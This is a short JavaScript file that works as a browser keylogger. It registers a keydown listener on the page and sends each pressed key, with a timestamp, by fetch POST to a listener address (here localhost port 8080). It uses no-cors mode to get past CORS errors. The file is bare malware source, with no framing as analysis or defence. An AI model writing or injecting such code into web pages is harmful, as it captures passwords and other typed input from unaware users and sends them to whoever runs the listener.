const server = "http://127.0.0.1:8080/key=";

function keyPrssed(event) {
    // get the key
    const key = event.key;

    // record the time key pressed
    const timestamp = new Date().toLocaleTimeString();

    // send a POST request to the listener
    fetch(server, {
        method: 'POST',
        headers: {
            // Specify the type of data being sent
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            key: key,
            timestamp: timestamp
        }),
        // Optional: Only include this if you don't need to handle the response and expect CORS issues
        mode: 'no-cors',
    })
}

document.addEventListener("keydown", keyPrssed);
